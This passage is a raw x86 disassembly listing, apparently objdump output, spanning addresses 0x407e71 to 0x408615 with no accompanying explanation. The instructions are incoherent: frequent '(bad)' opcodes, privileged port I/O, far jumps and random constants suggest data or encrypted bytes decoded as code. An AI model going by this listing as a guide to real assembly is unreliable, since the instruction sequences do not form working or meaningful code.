  407e71:	sub    DWORD PTR [ebp+0x7fd0569e],ebp
  407e77:	test   al,0x76
  407e79:	pop    ecx
  407e7a:	jmp    0x8120:0x189bd260
  407e81:	xchg   esp,eax
  407e82:	xchg   esi,eax
  407e83:	in     al,0x8f
  407e85:	xor    eax,0x147abe98
  407e8a:	dec    edi
  407e8b:	sahf   
  407e8c:	adc    bl,al
  407e8e:	mov    esi,DWORD PTR [edi]
  407e90:	ins    DWORD PTR es:[edi],dx
  407e91:	fs enter 0x59f1,0x69
  407e96:	push   esi
  407e97:	cli    
  407e98:	je     0x407e1c
  407e9a:	or     eax,0xca41e4a9
  407e9f:	or     eax,0xc53aee79
  407ea4:	gs jb  0x407f03
  407ea7:	dec    ebx
  407ea8:	jmp    0x407e5e
  407eaa:	xchg   esi,eax
  407eab:	daa    
  407eac:	inc    esp
  407ead:	push   eax
  407eae:	sahf   
  407eaf:	scas   al,BYTE PTR es:[edi]
  407eb0:	xlat   BYTE PTR ds:[ebx]
  407eb1:	or     al,0xfc
  407eb3:	pop    eax
  407eb4:	or     dl,BYTE PTR [ebx-0x2f]
  407eb7:	ds out dx,eax
  407eb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407eba:	shl    DWORD PTR [eax-0x33],0xa9
  407ebe:	pushf  
  407ebf:	push   ds
  407ec0:	jg     0x407ee0
  407ec2:	sub    eax,0x925456d6
  407ec7:	mov    ecx,0x5c8226ba
  407ecc:	sbb    esi,DWORD PTR [ebx+eiz*8-0x50dfabf1]
  407ed3:	xlat   BYTE PTR ds:[ebx]
  407ed4:	push   edx
  407ed5:	mov    ds:0xf1a6485e,al
  407edb:	add    edi,DWORD PTR [edx]
  407edd:	popa   
  407ede:	cli    
  407edf:	fldcw  WORD PTR [eax]
  407ee1:	inc    edx
  407ee2:	sbb    eax,0x9b3d8d6e
  407ee7:	and    al,0xef
  407ee9:	mov    bh,BYTE PTR [esi+0x45e25c71]
  407eef:	ja     0x407eda
  407ef1:	inc    eax
  407ef2:	pop    ecx
  407ef3:	mov    cl,0xa7
  407ef5:	mov    WORD PTR [esi+0x6d],?
  407ef8:	jbe    0x407ee6
  407efa:	mov    ecx,0x89f7a069
  407eff:	rol    DWORD PTR [edi-0x7f],0xb3
  407f03:	mov    dh,0x3b
  407f05:	jno    0x407ebb
  407f07:	mov    ds:0x59d92cac,al
  407f0c:	adc    ebp,edi
  407f0e:	rcl    ebx,1
  407f10:	xlat   BYTE PTR ds:[ebx]
  407f11:	arpl   ax,si
  407f13:	xor    ebp,DWORD PTR [esi+0x62]
  407f16:	imul   edi,DWORD PTR [ebx+0x11],0xffffffac
  407f1a:	xchg   ebp,eax
  407f1b:	mov    al,ds:0x51021ecd
  407f20:	pushf  
  407f21:	es call 0xf4d57b3d
  407f27:	nop
  407f28:	jbe    0x407f56
  407f2a:	adc    eax,0x8dd047f7
  407f2f:	or     al,0x1b
  407f31:	sbb    ch,BYTE PTR [esi+0x47]
  407f34:	mov    ch,0xd2
  407f36:	out    0x6a,al
  407f38:	xor    bl,BYTE PTR [ebp-0x11569164]
  407f3e:	cld    
  407f3f:	inc    esp
  407f40:	gs sub eax,0x64c53528
  407f46:	cli    
  407f47:	inc    esi
  407f48:	dec    edx
  407f49:	cdq    
  407f4a:	jno    0x407fac
  407f4c:	repz sub eax,0xc962dd0c
  407f52:	add    ecx,0x358faccb
  407f58:	fwait
  407f59:	pop    esp
  407f5a:	push   ecx
  407f5b:	jnp    0x407f81
  407f5d:	loope  0x407f1f
  407f5f:	mov    ecx,0x14947b86
  407f64:	arpl   cx,di
  407f66:	dec    edx
  407f67:	or     BYTE PTR [ecx-0x60eb709f],cl
  407f6d:	je     0x407f0c
  407f6f:	xlat   BYTE PTR ds:[ebx]
  407f70:	and    al,0x6
  407f72:	out    0x3f,eax
  407f74:	shl    DWORD PTR [ebx],cl
  407f76:	in     eax,dx
  407f77:	inc    edi
  407f78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f79:	lods   al,BYTE PTR ds:[esi]
  407f7a:	mov    eax,0xa6feda29
  407f7f:	mov    ecx,0x796e627e
  407f84:	std    
  407f85:	test   DWORD PTR [eax-0x4a6c1306],eax
  407f8b:	rcl    BYTE PTR [ebp-0x27],1
  407f8e:	test   al,0xf4
  407f90:	es (bad) 
  407f93:	js     0x407f16
  407f95:	jecxz  0x407f74
  407f97:	push   ss
  407f98:	data16 stos BYTE PTR es:[edi],al
  407f9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f9b:	std    
  407f9c:	leave  
  407f9d:	mov    ?,WORD PTR [edi]
  407f9f:	add    eax,0xa6647a0b
  407fa4:	scas   al,BYTE PTR es:[edi]
  407fa5:	fisubr DWORD PTR [eax-0x150ad18d]
  407fab:	adc    eax,0xb7636b7f
  407fb0:	mov    ds:0xc0203919,eax
  407fb5:	pop    ebx
  407fb6:	pop    es
  407fb7:	jno    0x407f3d
  407fb9:	out    dx,eax
  407fba:	jo     0x407fb3
  407fbc:	stos   DWORD PTR es:[edi],eax
  407fbd:	lods   eax,DWORD PTR ds:[esi]
  407fbe:	int3   
  407fbf:	xlat   BYTE PTR ds:[ebx]
  407fc0:	pop    ecx
  407fc1:	out    0x92,eax
  407fc3:	adc    ebx,DWORD PTR [esi-0x78]
  407fc6:	dec    ecx
  407fc7:	xor    DWORD PTR [edx],esp
  407fc9:	or     eax,0x1cdef5ba
  407fce:	pop    esi
  407fcf:	lods   eax,DWORD PTR ds:[esi]
  407fd0:	cs push ebx
  407fd2:	aas    
  407fd3:	dec    ebx
  407fd4:	sbb    ebx,DWORD PTR [edi+eax*8+0x1a]
  407fd8:	inc    esp
  407fd9:	mov    bh,0xd5
  407fdb:	push   cs
  407fdc:	jnp    0x407fe3
  407fde:	inc    ebx
  407fdf:	fwait
  407fe0:	retf   0x27ac
  407fe3:	iret   
  407fe4:	mov    DWORD PTR [bp+si-0x7e57],ebp
  407fe9:	sub    BYTE PTR ds:0x8964e9ef,dl
  407fef:	and    eax,DWORD PTR [esi-0x32]
  407ff2:	hlt    
  407ff3:	ins    DWORD PTR es:[edi],dx
  407ff4:	jl     0x407fb9
  407ff6:	popf   
  407ff7:	xchg   esp,eax
  407ff8:	ds stos DWORD PTR es:[edi],eax
  407ffa:	aas    
  407ffb:	aaa    
  407ffc:	sub    al,0x68
  407ffe:	sti    
  407fff:	cmc    
  408000:	add    DWORD PTR [ecx],esi
  408002:	shl    BYTE PTR [edi+0x49],0x75
  408006:	pop    ebp
  408007:	dec    eax
  408008:	dec    edx
  408009:	mov    DWORD PTR [ecx-0x5f198f42],edx
  40800f:	mov    edi,0x6e136750
  408014:	mov    cl,0xda
  408016:	push   cs
  408017:	mov    ebp,0x13ca5231
  40801c:	lods   eax,DWORD PTR ds:[esi]
  40801d:	xor    dh,BYTE PTR cs:[edx+ecx*1]
  408021:	cld    
  408022:	dec    eax
  408023:	inc    esi
  408024:	stc    
  408025:	mov    dh,0x14
  408027:	mov    dh,0xc7
  408029:	xchg   BYTE PTR [edx+0x4dd97254],cl
  40802f:	int3   
  408030:	dec    ebp
  408031:	add    esp,DWORD PTR [esi]
  408033:	mov    esp,0xc66fc50f
  408038:	fiadd  DWORD PTR [edi-0xee67b8e]
  40803e:	pop    esp
  40803f:	dec    esp
  408040:	pop    esi
  408041:	xchg   edx,eax
  408042:	nop
  408043:	popa   
  408044:	rcl    BYTE PTR [ebp-0x3ee92855],1
  40804a:	inc    eax
  40804b:	js     0x407ff9
  40804d:	xchg   DWORD PTR [edx],edx
  40804f:	push   ebp
  408050:	nop
  408051:	ficom  DWORD PTR [ebx+0x5d]
  408054:	cmp    al,0x3a
  408056:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408057:	dec    edi
  408058:	jns    0x408013
  40805a:	jmp    0x407fe4
  40805c:	call   edx
  40805e:	and    dh,BYTE PTR [edi+0x71]
  408061:	sub    eax,0x4b033b86
  408066:	jl     0x40803e
  408068:	jmp    0x408013
  40806a:	inc    esi
  40806b:	or     al,0xe
  40806d:	or     ebx,DWORD PTR [ecx+0x49]
  408070:	cs into 
  408072:	or     esi,edx
  408074:	xor    ebx,0x42d23130
  40807a:	cli    
  40807b:	mov    ds:0xa48617a1,eax
  408081:	aam    0xb8
  408083:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408084:	into   
  408085:	daa    
  408086:	pop    esp
  408087:	adc    ax,0x4014
  40808b:	sub    edi,edx
  40808d:	mov    eax,fs:0x6d4a42dd
  408093:	(bad)  
  408094:	cmp    ecx,ebx
  408096:	lods   al,BYTE PTR ds:[esi]
  408097:	push   edi
  408098:	mov    ds:0xb7a9c76b,eax
  40809d:	mov    al,ds:0x44deb261
  4080a2:	jmp    0x40803f
  4080a4:	add    BYTE PTR [ecx*2+0x2cad1d1],bl
  4080ab:	sbb    al,0x6e
  4080ad:	fldenv [edi-0x1ddc2df9]
  4080b3:	jo     0x408053
  4080b5:	sub    al,0x85
  4080b7:	cs inc edx
  4080b9:	xchg   ecx,eax
  4080ba:	push   esi
  4080bb:	jg     0x408125
  4080bd:	cmc    
  4080be:	rol    BYTE PTR [ebp+0x26],cl
  4080c1:	and    edi,DWORD PTR [edx]
  4080c3:	mov    bh,0xb
  4080c5:	sub    cl,BYTE PTR [edx]
  4080c7:	sub    DWORD PTR ds:[esi],0x28
  4080cb:	xchg   ebp,eax
  4080cc:	adc    eax,0x999542ce
  4080d1:	cwde   
  4080d2:	sbb    BYTE PTR [esi-0x3602d1b7],ch
  4080d8:	dec    ebp
  4080d9:	out    dx,al
  4080da:	lahf   
  4080db:	std    
  4080dc:	and    eax,0x375dab59
  4080e1:	dec    edx
  4080e2:	sahf   
  4080e3:	ja     0x4080c7
  4080e5:	mov    cl,0xc1
  4080e7:	push   edi
  4080e8:	addr16 cli 
  4080ea:	inc    ebx
  4080eb:	mov    WORD PTR [ebp+0x4c],fs
  4080ee:	aaa    
  4080ef:	(bad)  
  4080f0:	in     eax,0x7d
  4080f2:	xchg   edi,eax
  4080f3:	push   cs
  4080f4:	test   BYTE PTR [esi],dl
  4080f6:	cmp    eax,DWORD PTR [ebx+esi*1+0x77]
  4080fa:	mov    esi,0x18ee197f
  4080ff:	aam    0xbf
  408101:	push   es
  408102:	scas   eax,DWORD PTR es:[edi]
  408103:	xchg   ecx,eax
  408104:	push   edx
  408105:	test   eax,0xf8d39a65
  40810a:	cmp    ecx,DWORD PTR [ebx-0x45]
  40810d:	mov    dh,0x83
  40810f:	clc    
  408110:	push   ebp
  408111:	dec    esp
  408112:	in     al,dx
  408113:	inc    edx
  408114:	dec    ecx
  408115:	ja     0x4080bb
  408117:	mov    WORD PTR ds:0x8f51afe0,ss
  40811d:	push   cs
  40811e:	pop    ds
  40811f:	repz icebp 
  408121:	(bad)  
  408122:	stc    
  408123:	push   esi
  408124:	sti    
  408125:	(bad)  
  408126:	or     eax,0xdef5f085
  40812b:	ins    BYTE PTR es:[edi],dx
  40812c:	inc    edx
  40812d:	push   cs
  40812e:	push   0xffffff9a
  408130:	test   al,0x25
  408132:	push   cs
  408133:	clc    
  408134:	fs jecxz 0x40818e
  408137:	repz into 
  408139:	fs call 0x3909:0x66a4cbab
  408141:	pop    ss
  408142:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408143:	dec    ebx
  408144:	call   0xd5b82c90
  408149:	je     0x4080fd
  40814b:	pop    esp
  40814c:	inc    edi
  40814d:	sbb    BYTE PTR [edi-0x1ad68887],0x28
  408154:	sar    BYTE PTR [ebx+eax*1],0xb2
  408158:	rcl    BYTE PTR [edx-0x3],0xc9
  40815c:	mov    dh,0x63
  40815e:	sub    al,0x7a
  408160:	and    eax,0xea5f7c9b
  408165:	push   ebp
  408166:	fstp   DWORD PTR [eax-0x43abdcde]
  40816c:	push   es
  40816d:	dec    BYTE PTR [edi+0x68]
  408170:	rcr    BYTE PTR [esi-0x44],0xda
  408174:	inc    edx
  408175:	sub    DWORD PTR [edx+0x21b013a2],esp
  40817b:	dec    esi
  40817c:	or     BYTE PTR [edx],ah
  40817e:	push   eax
  40817f:	mov    cl,0xfe
  408181:	cmc    
  408182:	jbe    0x4081d9
  408184:	daa    
  408185:	and    ah,ah
  408187:	mov    ds:0x9848570d,al
  40818c:	add    BYTE PTR [ebp+0xe],0x3e
  408190:	aas    
  408191:	mov    ah,0x37
  408193:	(bad)  
  408194:	out    0x72,eax
  408196:	in     eax,dx
  408197:	xor    edi,DWORD PTR [ecx-0x69]
  40819a:	pop    ebp
  40819b:	mov    eax,0xb74db39d
  4081a0:	rol    BYTE PTR [eax-0x385263a8],cl
  4081a6:	pop    es
  4081a7:	retf   
  4081a8:	jecxz  0x40814d
  4081aa:	push   edx
  4081ab:	sbb    esi,DWORD PTR [ecx]
  4081ad:	nop
  4081ae:	dec    esi
  4081af:	cld    
  4081b0:	cld    
  4081b1:	cmp    ebx,DWORD PTR [ecx+0x2e044a3]
  4081b7:	in     al,0x20
  4081b9:	ins    DWORD PTR es:[edi],dx
  4081ba:	aad    0x54
  4081bc:	sub    edi,DWORD PTR [esi+edi*2]
  4081bf:	adc    al,0xaa
  4081c1:	out    dx,al
  4081c2:	dec    eax
  4081c3:	push   esp
  4081c4:	ror    BYTE PTR [ebx+0x2774516],0x36
  4081cb:	retf   
  4081cc:	cdq    
  4081cd:	cmp    dl,bl
  4081cf:	aad    0x1e
  4081d1:	sti    
  4081d2:	in     al,dx
  4081d3:	sti    
  4081d4:	pop    ds
  4081d5:	or     BYTE PTR [ecx],dl
  4081d7:	jecxz  0x40818f
  4081d9:	add    eax,0xa8c44d87
  4081de:	and    eax,0x78ddcc49
  4081e3:	ror    BYTE PTR [eax-0x246b9aea],0x61
  4081ea:	mov    ecx,0x68dcc956
  4081ef:	xlat   BYTE PTR ds:[ebx]
  4081f0:	inc    eax
  4081f1:	repz popf 
  4081f3:	cmc    
  4081f4:	cmp    eax,0xecf90b14
  4081f9:	into   
  4081fa:	or     al,0xc2
  4081fc:	loop   0x4081d0
  4081fe:	fwait
  4081ff:	mov    ch,0x81
  408201:	addr16 sbb al,0xbf
  408204:	xor    ecx,edi
  408206:	fdiv   DWORD PTR [ecx]
  408208:	pop    edi
  408209:	or     DWORD PTR ds:0x2ba8220c,esp
  40820f:	pop    eax
  408210:	and    al,0x81
  408212:	lahf   
  408213:	cmp    bh,ch
  408215:	shl    BYTE PTR [eax-0x26],0x80
  408219:	push   ds
  40821a:	and    dh,BYTE PTR [edx-0x24377a4]
  408220:	sub    DWORD PTR [eax+0x40],esp
  408223:	popa   
  408224:	cmp    ebx,DWORD PTR [edi+0x2ccefb08]
  40822a:	push   ebp
  40822b:	pop    ds
  40822c:	fidivr DWORD PTR [edi*4+0x1d9cbd7f]
  408233:	mov    ecx,0xa3e4793
  408238:	jne    0x40828b
  40823a:	mov    al,0xf8
  40823c:	push   ebp
  40823d:	scas   eax,DWORD PTR es:[edi]
  40823e:	ins    DWORD PTR es:[edi],dx
  40823f:	shl    BYTE PTR [edx+0x2fac88e4],1
  408245:	je     0x408210
  408247:	mov    bh,0x2e
  408249:	inc    esp
  40824a:	xchg   ebp,eax
  40824b:	in     eax,dx
  40824c:	repnz fwait
  40824e:	popf   
  40824f:	sar    BYTE PTR [edi],1
  408251:	ins    BYTE PTR es:[edi],dx
  408252:	mov    bl,0x9
  408254:	daa    
  408255:	loope  0x408206
  408257:	ds xchg ebx,eax
  408259:	clc    
  40825a:	mov    ah,cl
  40825c:	xchg   esp,eax
  40825d:	fsubr  QWORD PTR [edi-0x32]
  408260:	inc    esi
  408261:	cmp    BYTE PTR ss:[ecx+0x4ef0a358],ch
  408268:	ss je  0x40820c
  40826b:	mov    edi,0xf4044c7b
  408270:	aaa    
  408271:	xchg   BYTE PTR [ebp-0x5e],ch
  408274:	retf   
  408275:	test   cl,dl
  408277:	outs   dx,BYTE PTR ds:[esi]
  408278:	out    dx,al
  408279:	div    BYTE PTR [eax]
  40827b:	rcr    DWORD PTR [edx-0x2d],0xd9
  40827f:	xlat   BYTE PTR ds:[ebx]
  408280:	add    al,0x5f
  408282:	into   
  408283:	jge    0x408250
  408285:	mov    WORD PTR [ebx],?
  408287:	push   eax
  408288:	sahf   
  408289:	enter  0xc7b0,0x6
  40828d:	adc    DWORD PTR [edx-0x3c91b80b],ecx
  408293:	leave  
  408294:	xchg   DWORD PTR [esi-0x54c49357],ecx
  40829a:	inc    ebx
  40829b:	test   eax,0x1cc8d536
  4082a0:	mov    WORD PTR ds:0xef144778,es
  4082a6:	sub    dh,BYTE PTR [edx]
  4082a8:	stos   BYTE PTR es:[edi],al
  4082a9:	mov    dh,0x69
  4082ab:	rcl    BYTE PTR [esi+0x77],0x39
  4082af:	outs   dx,BYTE PTR ds:[esi]
  4082b0:	sub    dh,BYTE PTR ds:0xb42c706f
  4082b6:	dec    edi
  4082b7:	fsubr  QWORD PTR [eax+0x10]
  4082ba:	mov    ch,0x44
  4082bc:	repz stc 
  4082be:	mov    dl,0xcf
  4082c0:	inc    esi
  4082c1:	lahf   
  4082c2:	and    ah,cl
  4082c4:	js     0x4082fb
  4082c6:	inc    edx
  4082c7:	mov    bl,dl
  4082c9:	push   edx
  4082ca:	leave  
  4082cb:	in     al,0x12
  4082cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4082ce:	out    0xcb,eax
  4082d0:	rcl    DWORD PTR [ecx+0x6de27068],0x92
  4082d7:	mov    eax,0x3fa5681a
  4082dc:	push   edi
  4082dd:	inc    edx
  4082de:	or     DWORD PTR [edi+0x73],eax
  4082e1:	cmc    
  4082e2:	fucom  st(0)
  4082e4:	lock imul ecx,DWORD PTR [edi+esi*4-0x46f3bddc],0xf
  4082ed:	fs fdiv st(5),st
  4082f0:	ret    
  4082f1:	mov    dh,BYTE PTR [ecx]
  4082f3:	cld    
  4082f4:	mov    al,0x4d
  4082f6:	xchg   BYTE PTR [esi+0x4d8d179c],bl
  4082fc:	fwait
  4082fd:	or     dl,al
  4082ff:	xlat   BYTE PTR ds:[ebx]
  408300:	test   BYTE PTR [ebx+ebx*2],0xd6
  408304:	call   0x4ddd:0xeda0f6af
  40830b:	fist   DWORD PTR [ebx]
  40830d:	sbb    eax,0x338a72d5
  408312:	xor    ch,BYTE PTR [ebp+0x50ffea6a]
  408318:	mov    cl,0xbf
  40831a:	pop    es
  40831b:	xchg   ebp,eax
  40831c:	inc    edx
  40831d:	cmp    al,0x50
  40831f:	mov    al,0xf2
  408321:	mov    edx,0x8c3bb25a
  408326:	sbb    ah,0x18
  408329:	push   es
  40832a:	pop    ebp
  40832b:	in     al,0x76
  40832d:	add    BYTE PTR [ecx-0x21],dh
  408330:	fiadd  WORD PTR [eax-0x60acc7e9]
  408336:	jecxz  0x4082d8
  408338:	ror    DWORD PTR [ebp+0x34],1
  40833b:	leave  
  40833c:	fldenv [ecx]
  40833e:	stos   DWORD PTR es:[edi],eax
  40833f:	jg     0x408383
  408341:	ins    BYTE PTR es:[edi],dx
  408342:	into   
  408343:	repz add ah,bl
  408346:	jo     0x408385
  408348:	add    al,BYTE PTR [ebx-0x5255ec3f]
  40834e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40834f:	cmp    dh,BYTE PTR [ebp+0x65]
  408352:	pop    ecx
  408353:	mov    bl,0x6
  408355:	mov    ebp,0xfd398b11
  40835a:	jge    0x40832f
  40835c:	hlt    
  40835d:	pop    ebp
  40835e:	mov    edx,DWORD PTR [edi+0x68c83b2a]
  408364:	or     ch,BYTE PTR [ebp-0x12d18c30]
  40836a:	fistp  WORD PTR [ebp+0x4a]
  40836d:	neg    BYTE PTR [ecx+0x6f]
  408370:	rcr    DWORD PTR [esi-0x1b],0x91
  408374:	ins    BYTE PTR es:[edi],dx
  408375:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408376:	in     eax,dx
  408377:	mov    esp,0xa20e986e
  40837c:	sub    ebx,DWORD PTR [ebp+0x72]
  40837f:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  408381:	sub    eax,0xac13961c
  408386:	cmc    
  408387:	inc    ebp
  408388:	or     ebp,DWORD PTR [edi-0x39]
  40838b:	mov    ah,0xf8
  40838d:	neg    BYTE PTR [edx]
  40838f:	ss lahf 
  408391:	icebp  
  408392:	inc    ecx
  408393:	int3   
  408394:	fs push esp
  408396:	data16 jecxz 0x408407
  408399:	nop
  40839a:	loopne 0x40831d
  40839c:	loop   0x408381
  40839e:	adc    ebp,edx
  4083a0:	icebp  
  4083a1:	out    dx,al
  4083a2:	fwait
  4083a3:	call   0x1c24a01a
  4083a8:	cmp    dh,bh
  4083aa:	and    ebp,DWORD PTR [edi]
  4083ac:	push   esp
  4083ad:	call   0x5d14f3de
  4083b2:	xor    eax,0xee687bbf
  4083b7:	out    dx,eax
  4083b8:	ret    
  4083b9:	xchg   ebx,eax
  4083ba:	pop    esp
  4083bb:	cli    
  4083bc:	stc    
  4083bd:	and    dl,ch
  4083bf:	sub    DWORD PTR [eax+edi*2-0x45b3b1a2],eax
  4083c6:	popf   
  4083c7:	lock push 0x90f7187e
  4083cd:	jne    0x40843b
  4083cf:	xlat   BYTE PTR ds:[ebx]
  4083d0:	and    ah,BYTE PTR [ebp-0x6a]
  4083d3:	or     eax,0x19a4ad9d
  4083d8:	popf   
  4083d9:	dec    esp
  4083da:	sbb    DWORD PTR [edx-0x77e8354d],eax
  4083e0:	adc    al,bl
  4083e2:	pop    eax
  4083e3:	xchg   edx,eax
  4083e4:	add    eax,0x1ec1fc95
  4083e9:	adc    bh,BYTE PTR [ecx]
  4083eb:	sbb    eax,0xa9ad5e11
  4083f0:	jecxz  0x40842e
  4083f2:	or     DWORD PTR [ecx+esi*8],ecx
  4083f5:	sbb    eax,0x47454280
  4083fa:	add    ch,BYTE PTR [ecx-0x47]
  4083fd:	xchg   esi,eax
  4083fe:	stc    
  4083ff:	(bad)  
  408400:	ins    BYTE PTR es:[edi],dx
  408401:	jge    0x408481
  408403:	jmp    0xf145:0xf89f11f4
  40840a:	xchg   DWORD PTR [ecx-0xe],edi
  40840d:	xlat   BYTE PTR ds:[ebx]
  40840e:	(bad)  
  40840f:	ss test al,0x16
  408412:	loope  0x4083e0
  408414:	retf   0xe65e
  408417:	call   0xd8189fd6
  40841c:	icebp  
  40841d:	js     0x408405
  40841f:	and    DWORD PTR [ebp-0x7a700c85],0xc0910603
  408429:	or     eax,0xe6e7c6af
  40842e:	fwait
  40842f:	outs   dx,DWORD PTR ds:[esi]
  408430:	adc    DWORD PTR [ebp+0x7],esi
  408433:	pop    esi
  408434:	and    al,0x38
  408436:	add    edx,ebp
  408438:	dec    ebp
  408439:	and    eax,esi
  40843b:	bound  esi,QWORD PTR [esp+ecx*8-0x30]
  40843f:	push   ebx
  408440:	cmp    DWORD PTR [ebx-0x4b6bd53a],ebx
  408446:	loop   0x4084bd
  408448:	leave  
  408449:	sbb    BYTE PTR [ebx],0x98
  40844c:	cmp    al,0x66
  40844e:	out    0xad,al
  408450:	push   ss
  408451:	repnz or dh,ch
  408454:	(bad)  
  408455:	add    al,0x66
  408457:	jmp    0x4084ad
  408459:	lahf   
  40845a:	inc    eax
  40845b:	push   ds
  40845c:	mov    WORD PTR ds:0xf09c55ca,?
  408462:	je     0x408411
  408464:	xchg   edi,eax
  408465:	sahf   
  408466:	les    esi,FWORD PTR [ebp+0x1a]
  408469:	push   esi
  40846a:	call   0x87f6:0x1682634c
  408471:	adc    eax,0xda9e4768
  408476:	mov    ds:0xfd127ad6,al
  40847b:	add    eax,0x9b2ddad7
  408480:	fdivr  QWORD PTR ds:0x80341de
  408486:	pop    ds
  408487:	fxch   st(7)
  408489:	mov    es,WORD PTR [ebx+esi*4+0x67]
  40848d:	das    
  40848e:	mul    edx
  408490:	mov    ecx,0x8061ce40
  408495:	dec    edx
  408496:	fwait
  408497:	sbb    ebx,DWORD PTR [eax+0x57375256]
  40849d:	adc    eax,0x3bc65511
  4084a2:	mov    esi,0xe8c42791
  4084a7:	pop    ebp
  4084a8:	add    eax,DWORD PTR [esi+esi*8]
  4084ab:	pop    ebx
  4084ac:	out    0x2f,eax
  4084ae:	loopne 0x40849a
  4084b0:	push   ss
  4084b1:	pusha  
  4084b2:	mov    edi,0x28310d8e
  4084b7:	mov    DWORD PTR [edi-0x15],esp
  4084ba:	sub    eax,0xc38471b8
  4084bf:	inc    edx
  4084c0:	add    edi,DWORD PTR [eax+0x6f]
  4084c3:	in     al,dx
  4084c4:	pop    ss
  4084c5:	xor    eax,0xf4ac3402
  4084ca:	mov    DWORD PTR [edx+0x3],edx
  4084cd:	jo     0x408477
  4084cf:	xchg   edi,eax
  4084d0:	dec    edx
  4084d1:	dec    eax
  4084d2:	repnz nop
  4084d4:	mov    ds:0xb5ddbb6f,al
  4084d9:	pop    edi
  4084da:	sbb    BYTE PTR [eax+0x43],ah
  4084dd:	cld    
  4084de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4084df:	xor    BYTE PTR [esi+eax*2+0x443ebc33],bl
  4084e6:	stos   BYTE PTR es:[edi],al
  4084e7:	mov    BYTE PTR [edi-0x49f1652a],ah
  4084ed:	adc    al,0x1
  4084ef:	mov    BYTE PTR [edi],ch
  4084f1:	dec    ebx
  4084f2:	leave  
  4084f3:	cwde   
  4084f4:	mov    DWORD PTR [ecx-0x22ef878b],edi
  4084fa:	or     eax,0x1a285653
  4084ff:	xor    esi,edx
  408501:	sahf   
  408502:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408503:	shl    DWORD PTR [ecx],0xce
  408506:	scas   al,BYTE PTR es:[edi]
  408507:	imul   BYTE PTR [edx]
  408509:	int    0x52
  40850b:	rol    ch,1
  40850d:	out    dx,eax
  40850e:	loopne 0x408511
  408510:	mov    ebp,0x88a263e6
  408515:	lea    edi,[edi+ecx*4]
  408518:	icebp  
  408519:	mov    bh,0x41
  40851b:	rcl    ebx,cl
  40851d:	fwait
  40851e:	retf   0xced3
  408521:	jo     0x4084ce
  408523:	retf   
  408524:	jbe    0x408517
  408526:	xchg   esi,eax
  408527:	mov    ds:0xbbe83788,eax
  40852c:	mov    edi,0x189f2710
  408531:	nop
  408532:	stos   DWORD PTR es:[edi],eax
  408533:	enter  0x3ec2,0x65
  408537:	xor    edx,esi
  408539:	cmp    al,0x22
  40853b:	dec    edi
  40853c:	neg    ebx
  40853e:	imul   edx,DWORD PTR [ecx+0x50f15119],0xa6605495
  408548:	lods   eax,DWORD PTR ds:[esi]
  408549:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40854a:	jb     0x4084ed
  40854c:	(bad)  
  40854d:	mov    al,0x1f
  40854f:	mov    dh,0xb3
  408551:	test   al,0x96
  408553:	cmp    edx,ebp
  408555:	xchg   edx,eax
  408556:	xchg   ebp,eax
  408557:	ins    BYTE PTR es:[edi],dx
  408558:	test   DWORD PTR [edx+0x32],esp
  40855b:	add    DWORD PTR [eax-0x6b],ebp
  40855e:	cli    
  40855f:	(bad)  
  408560:	push   esi
  408561:	jle    0x408512
  408563:	pop    esp
  408564:	pop    ecx
  408565:	xchg   esi,eax
  408566:	js     0x4084fa
  408568:	mov    ebx,0xdb84c441
  40856d:	and    eax,0x54dd854d
  408572:	ins    DWORD PTR es:[edi],dx
  408573:	daa    
  408574:	retf   
  408575:	jmp    0x4085de
  408577:	int3   
  408578:	adc    eax,0x14eb3fa3
  40857d:	mov    ds:0xbf0a3dd0,eax
  408582:	push   esi
  408583:	mov    al,0x22
  408585:	stc    
  408586:	lods   al,BYTE PTR ds:[esi]
  408587:	xor    BYTE PTR [edx],dh
  408589:	mov    bl,0x86
  40858b:	scas   al,BYTE PTR es:[edi]
  40858c:	jno    0x408574
  40858e:	mov    ebx,0x3ab27a62
  408593:	xor    al,0x8
  408595:	js     0x408585
  408597:	les    edx,FWORD PTR [edi-0x445260ab]
  40859d:	loop   0x408562
  40859f:	lods   al,BYTE PTR ds:[esi]
  4085a0:	ja     0x408544
  4085a2:	mov    al,0xe3
  4085a4:	dec    esp
  4085a5:	xchg   al,cl
  4085a7:	cli    
  4085a8:	xlat   BYTE PTR gs:[ebx]
  4085aa:	dec    ebp
  4085ab:	xchg   ebx,eax
  4085ac:	adc    DWORD PTR [ebp-0xec0d098],ecx
  4085b2:	in     al,dx
  4085b3:	stos   BYTE PTR es:[edi],al
  4085b4:	push   es
  4085b5:	sub    al,0xf0
  4085b7:	loop   0x408611
  4085b9:	mov    ebx,0xb92cbcd3
  4085be:	mov    cl,0xcd
  4085c0:	xchg   BYTE PTR [edi-0x66dad4c8],bl
  4085c6:	ins    DWORD PTR es:[edi],dx
  4085c7:	push   edi
  4085c8:	pop    edx
  4085c9:	repnz call 0x4d8d:0xd96a95c9
  4085d1:	fwait
  4085d2:	add    edi,DWORD PTR ds:0xae56f8c7
  4085d8:	enter  0x526,0x4c
  4085dc:	pop    ecx
  4085dd:	mov    bl,0x5b
  4085df:	or     BYTE PTR es:[esi],bl
  4085e2:	(bad)
  4085e5:	add    eax,0x50cd21fa
  4085ea:	lock cmp eax,0xd308e654
  4085f0:	sbb    DWORD PTR [ecx],ebx
  4085f2:	sbb    dh,0x88
  4085f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4085f6:	inc    edx
  4085f7:	rol    bh,cl
  4085f9:	cmp    DWORD PTR [esi],0xe6cab090
  4085ff:	jne    0x408601
  408601:	(bad)  
  408602:	cmp    DWORD PTR [esi+0x1ad4b006],edi
  408608:	pop    ebx
  408609:	mov    al,ds:0x56af05c
  40860e:	mov    eax,ds:0x4f36db43
  408613:	mov    dh,0x73
  408615:	(bad)  
